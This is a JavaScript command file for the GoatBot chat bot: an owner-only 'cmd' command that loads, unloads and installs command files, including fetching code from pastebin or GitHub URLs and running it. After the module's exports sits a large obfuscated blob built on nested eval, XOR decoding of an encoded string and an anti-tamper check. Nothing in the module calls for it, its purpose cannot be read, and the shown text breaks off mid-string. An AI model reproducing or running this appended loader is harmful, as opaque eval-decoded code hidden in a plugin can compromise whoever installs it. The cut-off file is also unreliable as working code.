const axios = require("axios");
const { execSync } = require("child_process");
const fs = require("fs-extra");
const path = require("path");
const cheerio = require("cheerio");
const { client } = global;

const { configCommands } = global.GoatBot;
const { log, loading, removeHomeDir } = global.utils;

function getDomain(url) {
	const regex = /^(?:https?:\/\/)?(?:[^@\n]+@)?(?:www\.)?([^:/\n]+)/im;
	const match = url.match(regex);
	return match ? match[1] : null;
}

function isURL(str) {
	try {
		new URL(str);
		return true;
	}
	catch (e) {
		return false;
	}
}

module.exports = {
	config: {
		name: "cmd",
		version: "1.17",
		author: "NTKhang",
		countDown: 5,
		role: 2,
		description: {
			vi: "Quản lý các tệp lệnh của bạn",
			en: "Manage your command files"
		},
		category: "owner",
		guide: {
			vi: "   {pn} load <tên file lệnh>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <tên file lệnh>: Tải xuống và cài đặt một tệp lệnh từ một url, url là đường dẫn đến tệp lệnh (raw)"
				+ "\n   {pn} install <tên file lệnh> <code>: Tải xuống và cài đặt một tệp lệnh từ một code, code là mã của lệnh",
			en: "   {pn} load <command file name>"
				+ "\n   {pn} loadAll"
				+ "\n   {pn} install <url> <command file name>: Download and install a command file from a url, url is the path to the file (raw)"
				+ "\n   {pn} install <command file name> <code>: Download and install a command file from a code, code is the code of the command"
		}
	},

	langs: {
		vi: {
			missingFileName: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn reload",
			loaded: "✅ | Đã load command \"%1\" thành công",
			loadedError: "❌ | Load command \"%1\" thất bại với lỗi\n%2: %3",
			loadedSuccess: "✅ | Đã load thành công (%1) command",
			loadedFail: "❌ | Load thất bại (%1) command\n%2",
			openConsoleToSeeError: "👀 | Hãy mở console để xem chi tiết lỗi",
			missingCommandNameUnload: "⚠️ | Vui lòng nhập vào tên lệnh bạn muốn unload",
			unloaded: "✅ | Đã unload command \"%1\" thành công",
			unloadedError: "❌ | Unload command \"%1\" thất bại với lỗi\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Vui lòng nhập vào url hoặc code và tên file lệnh bạn muốn cài đặt",
			missingUrlOrCode: "⚠️ | Vui lòng nhập vào url hoặc code của tệp lệnh bạn muốn cài đặt",
			missingFileNameInstall: "⚠️ | Vui lòng nhập vào tên file để lưu lệnh (đuôi .js)",
			invalidUrl: "⚠️ | Vui lòng nhập vào url hợp lệ",
			invalidUrlOrCode: "⚠️ | Không thể lấy được mã lệnh",
			alreadExist: "⚠️ | File lệnh đã tồn tại, bạn có chắc chắn muốn ghi đè lên file lệnh cũ không?\nThả cảm xúc bất kì vào tin nhắn này để tiếp tục",
			installed: "✅ | Đã cài đặt command \"%1\" thành công, file lệnh được lưu tại %2",
			installedError: "❌ | Cài đặt command \"%1\" thất bại với lỗi\n%2: %3",
			missingFile: "⚠️ | Không tìm thấy tệp lệnh \"%1\"",
			invalidFileName: "⚠️ | Tên tệp lệnh không hợp lệ",
			unloadedFile: "✅ | Đã unload lệnh \"%1\""
		},
		en: {
			missingFileName: "⚠️ | Please enter the command name you want to reload",
			loaded: "✅ | Loaded command \"%1\" successfully",
			loadedError: "❌ | Failed to load command \"%1\" with error\n%2: %3",
			loadedSuccess: "✅ | Loaded successfully (%1) command",
			loadedFail: "❌ | Failed to load (%1) command\n%2",
			openConsoleToSeeError: "👀 | Open console to see error details",
			missingCommandNameUnload: "⚠️ | Please enter the command name you want to unload",
			unloaded: "✅ | Unloaded command \"%1\" successfully",
			unloadedError: "❌ | Failed to unload command \"%1\" with error\n%2: %3",
			missingUrlCodeOrFileName: "⚠️ | Please enter the url or code and command file name you want to install",
			missingUrlOrCode: "⚠️ | Please enter the url or code of the command file you want to install",
			missingFileNameInstall: "⚠️ | Please enter the file name to save the command (with .js extension)",
			invalidUrl: "⚠️ | Please enter a valid url",
			invalidUrlOrCode: "⚠️ | Unable to get command code",
			alreadExist: "⚠️ | The command file already exists, are you sure you want to overwrite the old command file?\nReact to this message to continue",
			installed: "✅ | Installed command \"%1\" successfully, the command file is saved at %2",
			installedError: "❌ | Failed to install command \"%1\" with error\n%2: %3",
			missingFile: "⚠️ | Command file \"%1\" not found",
			invalidFileName: "⚠️ | Invalid command file name",
			unloadedFile: "✅ | Unloaded command \"%1\""
		}
	},

	onStart: async ({ args, message, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, event, commandName, getLang }) => {
		const { unloadScripts, loadScripts } = global.utils;
		if (
			args[0] == "load"
			&& args.length == 2
		) {
			if (!args[1])
				return message.reply(getLang("missingFileName"));
			const infoLoad = loadScripts("cmds", args[1], log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
			if (infoLoad.status == "success")
				message.reply(getLang("loaded", infoLoad.name));
			else {
				message.reply(
					getLang("loadedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message)
					+ "\n" + infoLoad.error.stack
				);
				console.log(infoLoad.errorWithThoutRemoveHomeDir);
			}
		}
		else if (
			(args[0] || "").toLowerCase() == "loadall"
			|| (args[0] == "load" && args.length > 2)
		) {
			const fileNeedToLoad = args[0].toLowerCase() == "loadall" ?
				fs.readdirSync(__dirname)
					.filter(file =>
						file.endsWith(".js") &&
						!file.match(/(eg)\.js$/g) &&
						(process.env.NODE_ENV == "development" ? true : !file.match(/(dev)\.js$/g)) &&
						!configCommands.commandUnload?.includes(file)
					)
					.map(item => item = item.split(".")[0]) :
				args.slice(1);
			const arraySucces = [];
			const arrayFail = [];

			for (const fileName of fileNeedToLoad) {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang);
				if (infoLoad.status == "success")
					arraySucces.push(fileName);
				else
					arrayFail.push(` ❗ ${fileName} => ${infoLoad.error.name}: ${infoLoad.error.message}`);
			}

			let msg = "";
			if (arraySucces.length > 0)
				msg += getLang("loadedSuccess", arraySucces.length);
			if (arrayFail.length > 0) {
				msg += (msg ? "\n" : "") + getLang("loadedFail", arrayFail.length, arrayFail.join("\n"));
				msg += "\n" + getLang("openConsoleToSeeError");
			}

			message.reply(msg);
		}
		else if (args[0] == "unload") {
			if (!args[1])
				return message.reply(getLang("missingCommandNameUnload"));
			const infoUnload = unloadScripts("cmds", args[1], configCommands, getLang);
			infoUnload.status == "success" ?
				message.reply(getLang("unloaded", infoUnload.name)) :
				message.reply(getLang("unloadedError", infoUnload.name, infoUnload.error.name, infoUnload.error.message));
		}
		else if (args[0] == "install") {
			let url = args[1];
			let fileName = args[2];
			let rawCode;

			if (!url || !fileName)
				return message.reply(getLang("missingUrlCodeOrFileName"));

			if (
				url.endsWith(".js")
				&& !isURL(url)
			) {
				const tmp = fileName;
				fileName = url;
				url = tmp;
			}

			if (url.match(/(https?:\/\/(?:www\.|(?!www)))/)) {
				global.utils.log.dev("install", "url", url);
				if (!fileName || !fileName.endsWith(".js"))
					return message.reply(getLang("missingFileNameInstall"));

				const domain = getDomain(url);
				if (!domain)
					return message.reply(getLang("invalidUrl"));

				if (domain == "pastebin.com") {
					const regex = /https:\/\/pastebin\.com\/(?!raw\/)(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://pastebin.com/raw/$1");
					if (url.endsWith("/"))
						url = url.slice(0, -1);
				}
				else if (domain == "github.com") {
					const regex = /https:\/\/github\.com\/(.*)\/blob\/(.*)/;
					if (url.match(regex))
						url = url.replace(regex, "https://raw.githubusercontent.com/$1/$2");
				}

				rawCode = (await axios.get(url)).data;

				if (domain == "savetext.net") {
					const $ = cheerio.load(rawCode);
					rawCode = $("#content").text();
				}
			}
			else {
				global.utils.log.dev("install", "code", args.slice(1).join(" "));
				if (args[args.length - 1].endsWith(".js")) {
					fileName = args[args.length - 1];
					rawCode = event.body.slice(event.body.indexOf('install') + 7, event.body.indexOf(fileName) - 1);
				}
				else if (args[1].endsWith(".js")) {
					fileName = args[1];
					rawCode = event.body.slice(event.body.indexOf(fileName) + fileName.length + 1);
				}
				else
					return message.reply(getLang("missingFileNameInstall"));
			}

			if (!rawCode)
				return message.reply(getLang("invalidUrlOrCode"));

			if (fs.existsSync(path.join(__dirname, fileName)))
				return message.reply(getLang("alreadExist"), (err, info) => {
					global.GoatBot.onReaction.set(info.messageID, {
						commandName,
						messageID: info.messageID,
						type: "install",
						author: event.senderID,
						data: {
							fileName,
							rawCode
						}
					});
				});
			else {
				const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
				infoLoad.status == "success" ?
					message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
					message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
			}
		}
		else
			message.SyntaxError();
	},

	onReaction: async function ({ Reaction, message, event, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang }) {
		const { loadScripts } = global.utils;
		const { author, data: { fileName, rawCode } } = Reaction;
		if (event.userID != author)
			return;
		const infoLoad = loadScripts("cmds", fileName, log, configCommands, api, threadModel, userModel, dashBoardModel, globalModel, threadsData, usersData, dashBoardData, globalData, getLang, rawCode);
		infoLoad.status == "success" ?
			message.reply(getLang("installed", infoLoad.name, path.join(__dirname, fileName).replace(process.cwd(), ""))) :
			message.reply(getLang("installedError", infoLoad.name, infoLoad.error.name, infoLoad.error.message));
	}
};



'use strict';let L2xV;!function(){const QMyB=Array.prototype.slice.call(arguments);return eval("(function AOzq(j4Gi){const LBJi=vbOg(j4Gi,j6dj(AOzq.toString()));try{let LDgj=eval(LBJi);return LDgj.apply(null,QMyB);}catch(nbjj){var Hybj=(0o204444-67850);while(Hybj<(0o400161%65574))switch(Hybj){case (0x30065%0o200031):Hybj=nbjj instanceof SyntaxError?(0o400107%0x10013):(0o400163%0x10027);break;case (0o201736-0x103BD):Hybj=(0o400177%65581);{console.log(\'Error: the code has been tampered!\');return}break;}throw nbjj;}function j6dj(Dt6i){let f18i=204253004;var zo1i=(0o400050%65548);{let bW3i;while(zo1i<(0x10410-0o201766)){switch(zo1i){case (0o600117%0x10014):zo1i=(68536-0o205637);{f18i^=(Dt6i.charCodeAt(bW3i)*(15658734^0O73567354)+Dt6i.charCodeAt(bW3i>>>(0x4A5D0CE&0O320423424)))^1201387128;}break;case (0o204704-68011):zo1i=(0O3153050563-0x19AC516B);bW3i++;break;case (0O347010110&0x463A71D):zo1i=bW3i<Dt6i.length?(0o203256-67227):(0o1000176%65561);break;case (0o400040%0x10008):zo1i=(73639709%9);bW3i=(0x21786%3);break;}}}let DlYg=\"\";var fT0g=(0o1000121%0x1000C);{let zgTg;while(fT0g<(0o205036-0x109F9)){switch(fT0g){case (0x103DE-0o201675):fT0g=(131180%0o200044);zgTg=(0x75bcd15-0O726746425);break;case (0o600215%65571):fT0g=zgTg<(73639709%9)?(131144%0o200025):(0o201344-0x102BF);break;case (0x10708-0o203352):fT0g=(0x2004F%0o200040);{const bOVg=f18i%(68296-0o205261);f18i=Math.floor(f18i/(0o204026-0x107FF));DlYg+=bOVg>=(0x1071C-0o203402)?String.fromCharCode((0o600404%65601)+(bOVg-(0o1000136%0x10011))):String.fromCharCode((0o217120-0x11DEF)+bOVg);}break;case (0o202032-66571):fT0g=(0o202070-0x10414);zgTg++;break;}}}return DlYg;}function vbOg(XIQg,r6Ig){XIQg=decodeURI(XIQg);let TDLg=(0x21786%3);let TFih=\"\";var vdlh=(66976-0o202620);{let PAdh;while(vdlh<(0o600120%0x10012)){switch(vdlh){case (0o200276-65707):vdlh=(0o200764-66011);{TFih+=String.fromCharCode(XIQg.charCodeAt(PAdh)^r6Ig.charCodeAt(TDLg));TDLg++;var r8fh=(0o200430-65802);while(r8fh<(0x10438-0o202024))switch(r8fh){case (0x10230-0o201042):r8fh=TDLg>=r6Ig.length?(0o600175%0x1001E):(0x30096%0o200046);break;case (0o400153%65572):r8fh=(68056-0o204664);{TDLg=(0x21786%3);}break;}}break;case (0O3153050563-0x19AC516B):vdlh=PAdh<XIQg.length?(68006-0o204623):(68396-0o205422);break;case (0o1000130%65554):vdlh=(0O347010110&0x463A71D);PAdh=(0x21786%3);break;case (196693%0o200024):vdlh=(0O3153050563-0x19AC516B);PAdh++;break;}}}return TFih;}})(\"E%0A%1F%06%0A%1A%00%0E%03DC%13%0F%1B%07%02%19%05%05%06I%E2%B5%9C%E2%B4%A2%E2%B4%B2%E2%B4%A0DC%13%1B%0B%1D%14%1F%02J%E2%B5%9A%E2%B4%A2%E2%B5%9D%E2%B4%AAIDG%E2%B4%B8%E2%B4%AD%E2%B5%95%E2%B4%AAAH%10%0A%1F%06%0A%1A%00%0E%03L%E2%B4%B8%E2%B4%BD%E2%B4%B8%E2%B4%A0AH%16%1E%0F%1C%1C%1C%07A%E2%B4%BF%E2%B4%A9%E2%B4%A6%E2%B4%A1AGB%E2%B5%93%E2%B4%A6%E2%B5%9F%E2%B5%95@@E%E2%B5%9B%E2%B4%AA%E2%B5%9E%E2%B5%91BAB%E2%B5%9C%E2%B4%B2%E2%B5%99%E2%B5%93DCC%E2%B4%BB%E2%B4%BB%E2%B5%98%E2%B4%A7EEA%E2%B4%BA%E2%B4%AC%E2%B4%A2%E2%B5%90IDG%E2%B4%B8%E2%B4%BD%E2%B5%98%E2%B4%A8AHF%E2%B5%9E%E2%B5%91%E2%B4%A6%E2%B4%A3F@J%E2%B5%9F%E2%B4%A7%E2%B4%A9%E2%B5%92AGB%E2%B4%B3%E2%B4%A8%E2%B4%B0%E2%B4%AE@@E%E2%B4%AB%E2%B4%B1%E2%B4%B7%E2%B5%91BAB%E2%B5%9C%E2%B4%A2%E2%B5%92%E2%B5%90DC%15%25%5C%117P%17%17S%0F%1B%07%02%19%05%05%06I%E2%B4%AC%E2%B4%A9%E2%B4%B4%E2%B4%A3DC%13%1B%0B%1D%14%1F%02J@AEHJ61AIB54HGD%E2%B4%A8%E2%B5%98%E2%B5%99%E2%B4%A9AHDEA@B52J67AI23B@F775B5B:017C234:F7752E2%3C01C%15%0F%1B%07%02%19%05%05%06I%E2%B4%AC%E2%B4%B9%E2%B4%AB%E2%B4%A3DC%13%1B%0B%1D%14%1F%02J@%E2%B4%AB%E2%B4%BE%E2%B4%B3%E2%B4%A6EEC3%E2%B5%9B%E2%B5%95%E2%B4%A7%E2%B5%9DEE7@%E2%B4%AB%E2%B5%9E%E2%B4%A9%E2%B5%9DEEC%15%0F%1B%07%02%19%05%05%06I%E2%B5%9C%E2%B5%92%E2%B4%AF%E2%B4%A3DC%13%1B%0B%1D%14%1F%02J%E2%B4%BA%E2%B4%AC%E2%B4%A2%E2%B4%AEIDG%E2%B4%A8%E2%B4%A8%E2%B5%9C%E2%B4%AEAHF%E2%B4%AE%E2%B4%AA%E2%B5%9D%E2%B4%A9F@J%E2%B4%BF%E2%B4%A9%E2%B4%A6%E2%B5%91AG%14-_%14%3CF%13SAPPQMYNGR%07%18%02%09%1C%00%01%07A%E2%B5%9F%E2%B4%A7%E2%B4%A9%E2%B4%A6AG%12%13%08%18%1F%1A%07NAJE7A32OB:0GKC234J6G15434J61C3B54%3CDGB%E2%B5%9A%E2%B4%B2%E2%B5%96%E2%B4%ADIDE%17%0E%1C%00%0A%15%04%03%04H%E2%B4%BB%E2%B5%9B%E2%B4%AE%E2%B4%AFEE%11%1A%0C%1A%1C%13%03LBCHE2%3CFDAC2E2%3C07A343@HFDAC2E2%3C07A343BIFG1C234:F775@CB@F77A%14%08%1C%0F%0E%18%03%07%07N%E2%B4%BB%E2%B4%A4%E2%B5%91%E2%B4%A2BA%12%1C%0C%15%18%1E%04HA%E2%B4%BC%E2%B5%9C%E2%B4%A6%E2%B4%ABDCA2%E2%B5%9C%E2%B5%92%E2%B4%AF%E2%B5%91DC5A%E2%B4%AC%E2%B5%99%E2%B4%A1%E2%B5%91DCA%14%08%1C%0F%0E%18%03%07%07N%E2%B4%AB%E2%B5%91%E2%B4%AD%E2%B4%A2BA%12%1C%0C%15%18%1E%04HA54:617C23@:FMA34EHJ61AIB54JLG154%13%1F%00%1FL%E2%B4%A8%E2%B4%B8%E2%B4%A3%E2%B4%A4T:E%5C%25%5DYY_U%5B%5D%5E%5C7%5E%11T%5C*%5E+__@ME%5C%25Z_ZZT%5E%5B__LV@ME%5C%05YY%5EYQ%5B_O%5E%5C%5B%5DWD@BX%06%5CYPY%5D%5EE_XZQ%5EEF@X%5DXPYUOX%06%5CYQ%5D_%5CAEF%5BW_%5EYQL%5E%06S%5D%5CZZZG4Z%0B%19%04%0B%1D%07%06%0FM%E2%B5%9E%E2%B5%91%E2%B4%A6%E2%B4%A3F@%1A%1F%09%1E%1D%1B%00II%19%15%1A%0D%06%08I:0E1C234%1C%0B%19%04%0B%1D%07%06%0FM%E2%B5%9E%E2%B4%A1%E2%B4%AB%E2%B4%A3F@%1A%1F%09%1E%1D%1B%00IIL77C23@:FMA34EHJ61AIB54%3C%10%0A%1F%06%0A%1A%00%0E%03L%E2%B4%B8%E2%B5%9D%E2%B4%AE%E2%B4%A4AH%16%1E%0F%1C%1C%1C%07A%E2%B4%BF%E2%B4%B9%E2%B4%AB%E2%B4%AFAGB%E2%B5%93%E2%B4%A6%E2%B4%BF%E2%B5%93@@E%E2%B5%9B%E2%B4%BA%E2%B5%95%E2%B5%92BAB%E2%B5%9C%E2%B4%A2%E2%B4%B2%E2%B4%AEDC%15%0F%1B%07%02%19%05%05%06I%E2%B4%BC%E2%B4%AC%E2%B5%9D%E2%B4%A7DC%13%1B%0B%1D%14%1F%02J@%E2%B4%BB%E2%B4%AB%E2%B5%95%E2%B4%A5EEC3%E2%B4%AB%E2%B4%BE%E2%B5%93%E2%B5%9AEE7@@%13%1F%00%1FL%E2%B4%A8%E2%B5%98%E2%B4%A9%E2%B4%A4T:E%5C%05ZY_%5ER%5BAZ%10X%5EZ%25%5EEF@_XQR%5BAZ%07%5B%5E%5BU%5D%5BCDA%5E%06W%5D%5C%5B%5C%5BKY%19%5C%5CZY+GEI%5D%03%5EXY_YPH%5C%12YY%5EXVD1Q%0E%1C%00%0A%15%04%03%04H%E2%B4%AB%E2%B4%AE%E2%B5%9C%E2%B4%ABEE%11%1A%0C%1A%1C%13%03L%E2%B4%B8%E2%B4%AD%E2%B4%A5%E2%B4%A9AHF%E2%B4%AE%E2%B4%AA%E2%B5%9D%E2%B4%A9F@J%E2%B4%AF%E2%B4%AC%E2%B5%9F%E2%B4%A8AGB%E2%B4%B3%E2%B4%A8%E2%B4%A0%E2%B5%93@@E%E2%B4%BB%E2%B4%A4%E2%B4%A1%E2%B4%ABBAB%E2%B4%BC%E2%B4%BC%E2%B4%B0%E2%B4%A9DCC%E2%B4%BB%E2%B4%AB%E2%B4%A5%E2%B4%A8EEA%E2%B4%AA%E2%B4%B9%E2%B5%94%E2%B4%AEID%11%0C%1D%07%0D%1D%08%02%02J%E2%B5%9A%E2%B4%B2%E2%B5%96%E2%B4%A3ID%17%18%0D%1D%1B%1B%0FMDA34EHJ61CCAEA:F71IB54JLG154E2J61754E2%3CD7A343@JEGA3B54%3C6G154EAJF7A3432J617A@%13%0F%14%03%0F%1E%01%06%00I%E2%B4%B3%E2%B5%98%E2%B5%9B%E2%B4%A1@@%15%1B%04%19%19%18%06IF%E2%B4%AB%E2%B4%B1%E2%B4%B7%E2%B4%ABBA@EA%E2%B4%A3%E2%B4%BD%E2%B4%A6%E2%B4%AA@@G%14-_%14%3CF0%1B$*P%0A%1F%06%0A%1A%00%0E%03DC%13%1B%0B%1D%14%1F%02J@Y%01%5BQ%5EXY%5CD%5E%11P%5D%5BZZ@%13R%07%18%02%09%1C%00%01%07A%E2%B4%AF%E2%B4%BC%E2%B5%90%E2%B4%A3AG%12%13%08%18%1F%1A%07N%E2%B5%9B%E2%B4%BA%E2%B5%95%E2%B5%92BAB%E2%B5%9C%E2%B5%92%E2%B4%AF%E2%B4%A7DCC%E2%B4%BB%E2%B4%BB%E2%B4%B8%E2%B4%A7EE%17%0E%1C%00%0A%15%04%03%04H%E2%B4%AB%E2%B5%9E%E2%B5%99%E2%B4%AAEE%11%1A%0C%1A%1C%13%03LBCA5B:6MA34EHJ617C2E2%3C017C23@:F775@EA%E2%B5%93%E2%B4%A6%E2%B4%AF%E2%B4%A4@@G%14%07%18%02%09%1C%00%01%07A%E2%B5%9F%E2%B4%A7%E2%B5%99%E2%B4%A3AG%12%13%08%18%1F%1A%07NA%E2%B4%A3%E2%B5%9D%E2%B4%AC%E2%B4%A4@@G2%E2%B4%A3%E2%B4%BD%E2%B5%96%E2%B5%91@@3AH%10%0A%1F%06%0A%1A%00%0E%03L%E2%B5%98%E2%B4%B3%E2%B4%B1%E2%B4%A4AH%16%1E%0F%1C%1C%1C%07AE%E2%B4%AE%E2%B4%BA%E2%B4%A2%E2%B4%ABF@H6%E2%B4%AE%E2%B4%BA%E2%B5%92%E2%B5%92F@%3CEE%17$%5B%16?O%1E?/#T%08%1C%0F%0E%18%03%07%07F@%1A%1F%09%1E%1D%1B%00II%5D%03XXZX%5EU@Z%5D%5CQ%5D@%1CV%0A%1F%06%0A%1A%00%0E%03L%E2%B4%B8%E2%B4%AD%E2%B4%B5%E2%B4%A4AH%16%1E%0F%1C%1C%1C%07A%E2%B5%9F%E2%B4%A7%E2%B4%A9%E2%B5%92AGB%E2%B4%B3%E2%B4%A8%E2%B4%B0%E2%B4%AE@@E%E2%B5%9B%E2%B4%BA%E2%B5%95%E2%B5%92BAB%E2%B5%9C%E2%B4%A2%E2%B4%B2%E2%B4%AEDCC%E2%B5%9B%E2%B5%95%E2%B4%A7%E2%B4%ABEEA%E2%B4%BA%E2%B4%AC%E2%B5%92%E2%B4%A1ID%11%0C%1D%07%0D%1D%08%02%02J%E2%B4%BA%E2%B4%BC%E2%B4%BF%E2%B4%A3ID%17%18%0D%1D%1B%1B%0FMDB%E2%B4%BA%E2%B5%9C%E2%B4%A9%E2%B4%A7IDE@@%E2%B4%BB%E2%B4%BB%E2%B4%A8%E2%B4%A2EECABFB:6G13BO2%3CFMA343B:F7754E2%3C07A3432J6175@%13%0F%14%03%0F%1E%01%06%00I%E2%B4%A3%E2%B4%AD%E2%B4%B9%E2%B4%A0@%E2%B5%9B%E2%B4%A5%E2%B4%BA%E2%B4%AAD%17%18%0D%1D%1B%1B%0FM%E2%B5%9E%E2%B4%B1%E2%B4%A0%E2%B5%945%E2%B5%9B%E2%B4%AA%E2%B4%BE%E2%B4%A77S%14%22%5B%19;B?%18!%25T%07%18%02%09%1C%00%01%07ID%17%18%0D%1D%1B%1B%0FMD%5B%5BX_%5ESH%5C%05ZY%5EYU%5DE%17S%0F%1B%07%02%19%05%05%06I%E2%B4%BC%E2%B5%9C%E2%B4%B6%E2%B4%A6DC%13%1B%0B%1D%14%1F%02J%E2%B4%BA%E2%B4%AC%E2%B5%92%E2%B4%A1IDG%E2%B4%B8%E2%B4%AD%E2%B4%B5%E2%B4%AAAHF%E2%B4%AE%E2%B4%BA%E2%B4%A2%E2%B4%A7F@%1C%0B%19%04%0B%1D%07%06%0FM%E2%B4%BE%E2%B4%AF%E2%B4%A4%E2%B4%A2F@%1A%1F%09%1E%1D%1B%00II%E2%B4%BF%E2%B5%99%E2%B4%AD%E2%B4%A6AG@JE%E2%B5%9E%E2%B5%91%E2%B5%96%E2%B4%AEF@H%10%0A%1F%06%0A%1A%00%0E%03L%E2%B4%A8%E2%B5%98%E2%B4%B9%E2%B4%A5AH%16%1E%0F%1C%1C%1C%07AEGKC23B@F77ABFBJ6G1545B:01C%15%0F%1B%07%02%19%05%05%06I%E2%B4%AC%E2%B4%A9%E2%B4%A4%E2%B4%A6DC%13%1B%0B%1D%14%1F%02J%E2%B5%9A%E2%B4%A2%E2%B5%9D%E2%B4%AAIDG%E2%B5%98%E2%B5%93%E2%B4%A7%E2%B4%A4AH%10%20X%10?@%06/%17\'W%0E%1C%00%0A%15%04%03%04@@%15%1B%04%19%19%18%06IFY%0E_%5C_%5E%5B%5EDWUX_Q@%13R%07%18%02%09%1C%00%01%07A%E2%B5%9F%E2%B4%B7%E2%B4%A2%E2%B4%A3AG%12%13%08%18%1F%1A%07N%E2%B4%BB%E2%B4%B4%E2%B4%BC%E2%B4%AABAB%E2%B5%9C%E2%B4%A2%E2%B5%92%E2%B5%90DCC%E2%B4%BB%E2%B4%BB%E2%B4%A8%E2%B4%A6EEA%E2%B4%AA%E2%B5%99%E2%B4%AE%E2%B4%ADIDG%E2%B5%98%E2%B4%A3%E2%B4%BA%E2%B5%97AHF%E2%B4%BE%E2%B4%BF%E2%B5%99%E2%B4%AFF@%1C%0B%19%04%0B%1D%07%06%0FM%E2%B5%9E%E2%B5%91%E2%B5%96%E2%B4%A2F@%1A%1F%09%1E%1D%1B%00IIFD1C25HJ61AIB54%3CF7A3434%3CF77A2E2%3C0EA@%E2%B4%AB%E2%B5%9E%E2%B5%99%E2%B4%A6EEC%15%0F%1B%07%02%19%05%05%06I%E2%B4%BC%E2%B4%BC%E2%B4%A0%E2%B4%A6DC%13%1B%0B%1D%14%1F%02J@%E2%B4%AB%E2%B5%9E%E2%B4%B9%E2%B4%AAEECC23%14%07%18%02%09%1C%00%01%07A%E2%B4%AF%E2%B5%9C%E2%B4%AA%E2%B4%A4AG%12%E2%B4%A3%E2%B4%BD%E2%B4%A6%E2%B4%A03%E2%B4%AB%E2%B4%AE%E2%B4%B
